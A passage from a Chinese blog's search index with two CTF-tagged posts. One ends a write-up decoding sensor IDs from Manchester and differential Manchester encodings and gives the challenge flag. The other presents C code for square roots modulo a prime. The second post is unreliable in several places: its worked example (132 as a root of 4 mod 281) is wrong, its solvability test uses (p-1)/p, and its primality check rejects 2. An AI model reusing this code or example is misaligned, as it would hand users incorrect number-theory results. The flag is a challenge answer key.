alt="传感器1"></p><p>知识回顾的差不多了，回到题目，开始撸代码<br>由于涉及到各种进制转换和划分，c++和java过于反人类，啥都要自己写，不如用python,python很多内嵌方法就能进行进制转换和划分了。<br>思路很简单 直接贴代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bintohex</span>(<span class="params">s1</span>):</span></span><br><span class="line">    s = re.findall(<span class="string">&#x27;.&#123;4&#125;&#x27;</span>, s1)</span><br><span class="line">    s2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        s2 += <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(i, <span class="number">2</span>))).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> s2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">diffmqst</span>(<span class="params">s1</span>):</span> <span class="comment">#差分曼切斯特</span></span><br><span class="line">    pre = <span class="string">&#x27;01&#x27;</span></span><br><span class="line">    rst = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    s = re.findall(<span class="string">&#x27;.&#123;2&#125;&#x27;</span>,s1)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> i==pre:</span><br><span class="line">            rst += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        <span class="keyword">else</span> : rst+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">        pre = i</span><br><span class="line">    <span class="keyword">return</span> rst</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    hex1 = <span class="string">&#x27;AAAAA56A69AA55A95995A569AA95565556&#x27;</span></span><br><span class="line">    hex2 = <span class="string">&#x27;0x8893CA58&#x27;</span></span><br><span class="line">    bin1 = <span class="built_in">bin</span>(<span class="built_in">int</span>(hex1, <span class="number">16</span>)).replace(<span class="string">&#x27;0b&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    bin2 = re.findall(<span class="string">&#x27;.&#123;4&#125;&#x27;</span>, <span class="built_in">bin</span>(<span class="built_in">int</span>(hex1, <span class="number">16</span>)).replace(<span class="string">&#x27;0b&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">    dict1 = &#123;<span class="string">&#x27;0101&#x27;</span>: <span class="string">&#x27;11&#x27;</span>, <span class="string">&#x27;1010&#x27;</span>:<span class="string">&#x27;00&#x27;</span>, <span class="string">&#x27;1001&#x27;</span>:<span class="string">&#x27;01&#x27;</span>, <span class="string">&#x27;0110&#x27;</span>: <span class="string">&#x27;10&#x27;</span>&#125; <span class="comment">#曼切斯特编码1 Thomas</span></span><br><span class="line">    dict2 = &#123;<span class="string">&#x27;0101&#x27;</span>: <span class="string">&#x27;00&#x27;</span>, <span class="string">&#x27;1010&#x27;</span>:<span class="string">&#x27;11&#x27;</span>, <span class="string">&#x27;1001&#x27;</span>:<span class="string">&#x27;10&#x27;</span>, <span class="string">&#x27;0110&#x27;</span>: <span class="string">&#x27;01&#x27;</span>&#125; <span class="comment">#曼切斯特编码2 IEEE802.3</span></span><br><span class="line">    m1 = <span class="string">&#x27;&#x27;</span>.join(dict1[_] <span class="keyword">for</span> _ <span class="keyword">in</span> bin2)</span><br><span class="line">    m2 = <span class="string">&#x27;&#x27;</span>.join(dict2[_] <span class="keyword">for</span> _ <span class="keyword">in</span> bin2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;曼切斯特编码1 id1: &quot;</span>, bintohex(m1))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;曼切斯特编码2 id2: &quot;</span>, bintohex(m2))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;差分曼切斯特编码 id3: &quot;</span>, bintohex(diffmqst(bin1)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">曼切斯特编码1 id1:  003890f1d73907efe</span><br><span class="line">曼切斯特编码2 id2:  ffc76f0e28c6f8101</span><br><span class="line">差分曼切斯特编码 id3:  8024d8893ca584181</span><br></pre></td></tr></table></figure><p>发现差分曼切斯特中包含传感器A的ID<br>沿这个思路， 不难找到传感器B的ID</p><p>flag=8845abf3</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
            <tag> 曼切斯特编码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数论 模p平方根算法（C）</title>
      <link href="2019/05/27/%E6%95%B0%E8%AE%BA%EF%BC%9A%E6%A8%A1p%E5%B9%B3%E6%96%B9%E6%A0%B9%E7%AE%97%E6%B3%95/"/>
      <url>2019/05/27/%E6%95%B0%E8%AE%BA%EF%BC%9A%E6%A8%A1p%E5%B9%B3%E6%96%B9%E6%A0%B9%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>算法</p><span id="more"></span><p><img src="/2019/05/27/%E6%95%B0%E8%AE%BA%EF%BC%9A%E6%A8%A1p%E5%B9%B3%E6%96%B9%E6%A0%B9%E7%AE%97%E6%B3%95/shulun.jpg" alt="数论"><br>模p平方根算法用来快速计算二次同余式<br>计算模p平方根例子:<br>$x^2$ $\equiv$ 4 (mod 281)<br>该二次同余式解为 x  $\equiv$ 132 (mod 281)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 10</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cal_s</span><span class="params">(<span class="keyword">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp=p<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">while</span>(temp%<span class="number">2</span>==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        temp = temp/<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> temp;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inverse</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;m;i++)</span><br><span class="line"><span class="keyword">if</span>((a*i)%m==<span class="number">1</span>)<span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cal_t</span><span class="params">(<span class="keyword">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp=p<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(temp%<span class="number">2</span>==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        temp = temp/<span class="number">2</span>;</span><br><span class="line">        cnt++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getn</span><span class="params">(<span class="keyword">int</span> p)</span><span class="comment">//get模的平方非剩余n</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;p;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(power(i,(p<span class="number">-1</span>)/<span class="number">2</span>,p)==p<span class="number">-1</span>)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">power</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> m)</span><span class="comment">//计算 x^y%m</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(y==<span class="number">0</span>)<span class="keyword">return</span> <span class="number">1</span>%m;</span><br><span class="line"><span class="keyword">int</span>  ret=x%m;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;y<span class="number">-1</span>;i++)</span><br><span class="line">ret=(ret*x)%m;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">normal_power</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span><span class="comment">//计算a^b</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ret=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;b;i++)</span><br><span class="line">ret*=a;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">is_prime</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(n==<span class="number">2</span>)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">double</span> x=<span class="built_in">sqrt</span>(n);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=x;i++)</span><br><span class="line"><span class="keyword">if</span>(n%i==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,p,n,b,s,t,_a;</span><br><span class="line">    <span class="keyword">int</span> x[MAX];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入a,p, 用空格区分：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;a, &amp;p);</span><br><span class="line">    <span class="keyword">if</span>(!is_prime(p))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;p不是素数，请重新尝试\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p是素数\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(power(a,(p<span class="number">-1</span>)/p,p)==p<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;该二次同余式无解\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;该二次同余式有解\n&quot;</span>);</span><br><span class="line">    n = getn(p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;模p平方二次非剩余n = %d\n&quot;</span>,n);</span><br><span class="line">    <span class="keyword">while</span>(a&lt;<span class="number">0</span>)a+=p;</span><br><span class="line"><span class="keyword">while</span>(a&gt;p)a-=p;</span><br><span class="line">    s = cal_s(p);</span><br><span class="line">    t = <span class="keyword">cal_t</span>(p);</span><br><span class="line">    <span class="keyword">if</span>(t==<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        x[<span class="number">0</span>] = power(a,(s+<span class="number">1</span>)/<span class="number">2</span>,p);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;由于t = 1，同余式的解 = %d\n&quot;</span>,x[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    b = power(n,s,p);</span><br><span class="line">_a = inverse(a,p);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a = %d, p = %d, n = %d, t = %d, s = %d, b = %d\n&quot;</span>,a,p,n,t,s,b);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;MAX;i++)x[i]=<span class="number">0</span>;</span><br><span class="line">x[t<span class="number">-1</span>]=power(a,(s+<span class="number">1</span>)/<span class="number">2</span>,p);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;x[%d] = %d\n&quot;</span>,t<span class="number">-1</span>,x[t<span class="number">-1</span>]);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span>;k&lt;=t<span class="number">-1</span>;k++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> judge=power((_a*x[t-k]*x[t-k])%p,normal_power(<span class="number">2</span>,t-k<span class="number">-1</span>),p);</span><br><span class="line">        <span class="keyword">if</span>(judge==<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            x[t-k<span class="number">-1</span>] = x[t-k];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;j[%d] = 0\n&quot;</span>,k<span class="number">-1</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;x[%d] = %d\n&quot;</span>, t-k<span class="number">-1</span>,x[t-k<span class="number">-1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(judge==p<span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            x[t-k<span class="number">-1</span>]=(power(b,normal_power(<span class="number">2</span>,k<span class="number">-1</span>),p)*x[t-k])%p;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;j[%d] = 1\n&quot;</span>,k<span class="number">-1</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;x[%d] = %d\n&quot;</span>, t-k<span class="number">-1</span>, x[t-k<span class="number">-1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;二次同余式解x[0] = %d\n&quot;</span>,x[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>思路来源：《信息安全数学基础》 –陈恭亮</p></blockquote><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 数论 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
